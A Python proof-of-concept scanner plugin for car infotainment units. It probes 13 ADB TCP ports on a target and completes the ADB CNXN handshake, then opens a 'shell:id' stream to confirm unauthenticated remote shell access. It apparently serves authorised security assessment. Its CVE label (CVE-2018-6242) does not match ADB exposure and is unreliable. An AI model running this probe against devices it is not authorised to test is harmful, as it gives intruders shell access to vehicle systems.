"""
PoC Name: Network ADB Debug Port Detection
CVE: CVE-2018-6242
Component: Android Debug Bridge (ADB) over TCP
Category: Network
Severity: Critical
CVSS: 9.8
Description: 扫描所有已知 ADB TCP 端口并尝试 ADB CNXN / shell OPEN 握手，检测网络暴露的未授权远程 Shell 访问（含工程模式端口）。
Prerequisites: 目标 IVI 运行 Android/HarmonyOS 系统，且 ADB over TCP 已启用。
Usage: python3 02_ADB_Debug_Port.py <target_ip>
"""
import socket
import struct
import sys

from iv_plugin_base import IVIVulnerabilityPlugin


ADB_CNXN_PACKET = (
    b"CNXN"
    b"\x00\x00\x00\x01"
    b"\x00\x10\x00\x00"
    b"\x07\x00\x00\x00"
    b"\x32\x02\x00\x00"
    b"\xbc\xb1\xa7\xb1"
    b"host::\x00"
)

ADB_PORTS = [
    (5555, "标准 ADB over TCP"),
    (5556, "多设备顺延-2"),
    (5558, "多设备顺延-3"),
    (9527, "工程模式 (AION/国产 IVI)"),
    (6789, "HarmonyOS/鸿蒙车机"),
    (4444, "旧版 ADB server"),
    (7777, "MTK/高通车机测试"),
    (8888, "第三方工具监听"),
    (9999, "第三方工具监听"),
    (2233, "OEM 私有工程端口"),
    (4567, "OEM 私有工程端口"),
    (5037, "ADB server 本地通信"),
    (1234, "root 工具绑定"),
]


class ADBDebugPortPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-002"
    meta_poc_name = "Network ADB Debug Port Detection"
    meta_cve_id = "CVE-2018-6242"
    meta_severity = "Critical"
    meta_protocol = "tcp"
    meta_target_os = ["android", "harmonyos"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标 IP 地址。")
        return True

    def _adb_checksum(self, payload):
        return sum(payload) & 0xFFFFFFFF

    def _adb_packet(self, command, arg0=0, arg1=0, payload=b""):
        if isinstance(command, str):
            command = command.encode("ascii")
        cmd_int = struct.unpack("<I", command)[0]
        payload = payload or b""
        header = struct.pack(
            "<6I",
            cmd_int,
            arg0,
            arg1,
            len(payload),
            self._adb_checksum(payload),
            cmd_int ^ 0xFFFFFFFF,
        )
        return header + payload

    def _recv_exact(self, sock, size):
        chunks = []
        remaining = size
        while remaining > 0:
            chunk = sock.recv(remaining)
            if not chunk:
                break
            chunks.append(chunk)
            remaining -= len(chunk)
        return b"".join(chunks)

    def _recv_adb_packet(self, sock):
        try:
            header = self._recv_exact(sock, 24)
            if len(header) < 24:
                return None, b""
            cmd_int, arg0, arg1, length, checksum, magic = struct.unpack("<6I", header)
            command = struct.pack("<I", cmd_int)
            payload = self._recv_exact(sock, length) if length else b""
            return {
                "command": command,
                "arg0": arg0,
                "arg1": arg1,
                "length": length,
                "checksum": checksum,
                "magic": magic,
            }, payload
        except Exception:
            return None, b""

    def _try_shell_open(self, sock, remote_id):
        local_id = 1
        sock.sendall(self._adb_packet(b"OPEN", local_id, remote_id, b"shell:id\x00"))
        packet, payload = self._recv_adb_packet(sock)
        if not packet:
            return False, b""
        return packet["command"] in {b"OKAY", b"WRTE"}, payload

    def _check_adb_port(self, port, timeout=4):
        result = {"open": False, "command": b"", "unauthorized_shell": False, "detail": b""}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            if sock.connect_ex((self.target_ip, port)) != 0:
                sock.close()
                return result

            result["open"] = True
            sock.sendall(ADB_CNXN_PACKET)
            packet, payload = self._recv_adb_packet(sock)
            if not packet:
                sock.close()
                return result

            result["command"] = packet["command"]
            result["detail"] = payload[:128]
            if packet["command"] == b"CNXN":
                shell_ok, shell_payload = self._try_shell_open(sock, packet["arg0"])
                result["unauthorized_shell"] = shell_ok
                if shell_payload:
                    result["detail"] = shell_payload[:128]
            sock.close()
            return result
        except Exception:
            return result

    def exploit(self):
        host = self.target_ip
        self.logger.info(f"开始网络扫描 {host} 上所有已知 ADB 端口（共 {len(ADB_PORTS)} 个）...")

        open_ports = []
        auth_required_ports = []
        vulnerable_ports = []

        for port, desc in ADB_PORTS:
            self.logger.info(f"  探测 {host}:{port} ({desc})...")
            probe = self._check_adb_port(port)

            if not probe["open"]:
                self.logger.info("    [-] 端口关闭")
                continue

            self.logger.info("    [+] 端口开放")
            open_ports.append((port, desc))

            if probe["command"] == b"CNXN" and probe["unauthorized_shell"]:
                self.logger.warning(f"    [!!!] ADB 握手成功且 shell OPEN 被接受 - 端口 {port} ({desc})")
                vulnerable_ports.append((port, desc, probe["detail"][:40]))
            elif probe["command"] == b"AUTH":
                self.logger.info("    [*] 目标要求 ADB 认证，未确认未授权访问。")
                auth_required_ports.append((port, desc))
            elif probe["command"] == b"CNXN":
                self.logger.info("    [*] 收到 CNXN 但未能确认 shell OPEN，结果保守处理。")
            else:
                banner_preview = repr(probe["detail"][:32]) if probe["detail"] else "(无响应)"
                self.logger.info(f"    [*] 未确认未授权 ADB shell（首包={probe['command']!r}）: {banner_preview}")

        if vulnerable_ports:
            self.results["vulnerable"] = True
            details = "\n".join(
                f"  端口 {port} ({desc}) - ADB CNXN 接受，banner: {repr(detail)}"
                for port, desc, detail in vulnerable_ports
            )
            self.results["evidence"] = (
                f"发现 {len(vulnerable_ports)} 个未授权 ADB 网络端口（CVE-2018-6242）：\n{details}"
            )
        elif auth_required_ports or open_ports:
            evidence_lines = []
            if auth_required_ports:
                evidence_lines.append("以下端口返回 AUTH，说明启用了 ADB 认证：")
                evidence_lines.extend(f"  端口 {port} ({desc})" for port, desc in auth_required_ports)
            if open_ports:
                evidence_lines.append("其余开放端口未确认可直接获得 shell：")
                evidence_lines.extend(
                    f"  端口 {port} ({desc})"
                    for port, desc in open_ports
                    if (port, desc) not in auth_required_ports
                )
            self.results["evidence"] = "\n".join(evidence_lines)
        else:
            self.results["evidence"] = f"未发现任何已知 ADB 网络端口开放（共检测 {len(ADB_PORTS)} 个端口）"
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 02_ADB_Debug_Port.py <target_ip>")
        sys.exit(1)
    plugin = ADBDebugPortPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
